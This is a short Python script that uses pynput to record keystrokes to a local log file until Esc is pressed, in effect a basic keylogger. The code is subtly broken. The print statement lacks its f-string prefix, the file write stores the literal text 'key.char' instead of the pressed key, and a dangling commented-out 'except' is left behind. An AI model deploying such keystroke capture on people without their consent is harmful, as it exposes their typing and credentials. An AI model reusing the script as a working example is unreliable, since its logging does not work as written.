from pynput import keyboard

def on_press(key):
    print("Key {key.char} has been pressed")
    with open("data/Log.txt","a") as log_file:
        log_file.write(f'key.char')
    # except:
    
def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()